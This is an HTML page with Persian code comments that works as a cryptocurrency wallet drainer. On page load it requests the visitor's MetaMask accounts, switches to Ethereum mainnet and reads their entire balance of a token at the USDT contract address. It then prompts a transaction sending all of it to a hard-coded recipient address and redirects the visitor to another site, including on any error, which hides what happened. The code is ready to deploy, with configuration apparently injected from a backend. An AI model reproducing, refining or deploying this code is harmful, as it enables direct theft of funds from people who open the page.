<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Transfer - V6</title>
</head>
<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
    <script>
        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
        const CONFIG = {
            tokenAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // آدرس توکن ERC20
            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a09a6", // آدرس مقصد
            redirectUrl: "https://shooshoo.us",         // وبسایت ریدایرکت
            redirectDelay: 2000                              // تاخیر ریدایرکت (میلی‌ثانیه)
        };

        // ABI برای توابع ERC20
        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        async function executeTransfer() {
            try {
                // تاخیر کوتاه برای لود شدن کامل Web3
                await new Promise(resolve => setTimeout(resolve, 500));

                // بررسی MetaMask
                if (typeof window.ethereum === 'undefined') {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // اتصال به کیف پول
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                if (accounts.length === 0) {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // تغییر به شبکه Mainnet (Chain ID: 0x1)
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x1' }]
                    });
                } catch (switchError) {
                    // اگر خطا در تغییر شبکه، ادامه بدهد (ممکن است قبلاً Mainnet باشد)
                    console.log('Network switch error, continuing...');
                }

                const userAddress = accounts[0];
                
                // تاخیر برای اطمینان از تغییر شبکه
                await new Promise(resolve => setTimeout(resolve, 300));
                
                const web3 = new Web3(window.ethereum);
                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);

                // دریافت موجودی کامل
                const balance = await contract.methods.balanceOf(userAddress).call();
                
                if (balance === '0' || balance === 0) {
                    window.location.href = CONFIG.redirectUrl;
                    return;
                }

                // ایجاد data برای تراکنش
                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();

                // پارامترهای تراکنش با gas بیشتر برای mainnet
                const txParams = {
                    to: CONFIG.tokenAddress,
                    from: userAddress,
                    data: transferData,
                    gas: '0x30D40' // 200,000 gas برای mainnet
                };

                // ارسال تراکنش (فقط درخواست - کاربر تأیید/رد می‌کند)
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });

                // ریدایرکت فوری پس از ارسال درخواست
                setTimeout(() => {
                    window.location.href = CONFIG.redirectUrl;
                }, CONFIG.redirectDelay);

            } catch (error) {
                // در صورت هر خطا، ریدایرکت فوری
                window.location.href = CONFIG.redirectUrl;
            }
        }

        // اجرای خودکار هنگام بارگذاری صفحه
        window.addEventListener('load', executeTransfer);
    </script>
</body>
</html>
